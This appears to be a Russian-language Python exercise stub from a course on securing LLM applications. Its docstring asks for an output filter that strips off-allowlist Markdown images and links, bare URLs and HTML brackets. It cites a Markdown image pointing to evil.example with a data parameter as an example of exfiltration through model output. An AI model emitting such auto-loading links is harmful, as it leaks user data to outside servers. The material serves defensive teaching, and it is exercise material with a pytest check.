"""Задание 4. Выход: ответ модели — тоже недоверенный текст (глава III, LLM10).

Сейчас ответ уходит пользователю как есть. Если в нём Markdown-картинка
![](https://evil.example/c?d=...), клиент сам загрузит её и отправит данные на чужой сервер.

check_output(text, allowed_hosts) — вернуть безопасный вариант ответа:
  - Markdown-картинки ![alt](url) и ссылки [текст](url) с адресом ВНЕ allowed_hosts:
    картинку заменить на «[изображение удалено]», у ссылки оставить только текст;
  - «голые» адреса http(s)://... вне allowed_hosts заменить на «[ссылка удалена]»;
  - хост «внутри списка» — это сам хост или его поддомен (docs.company.example разрешает
    и sub.docs.company.example, но не evil-docs.company.example.attacker.com);
  - символы < и > заменить на &lt; и &gt;, чтобы ответ нельзя было вставить на страницу как HTML.
Используйте urllib.parse.urlparse(url).hostname.

Проверка: pytest tests/test_04_output.py
"""


def check_output(text: str, allowed_hosts: set) -> str:
    # TODO: реализуйте проверки из описания.
    return text
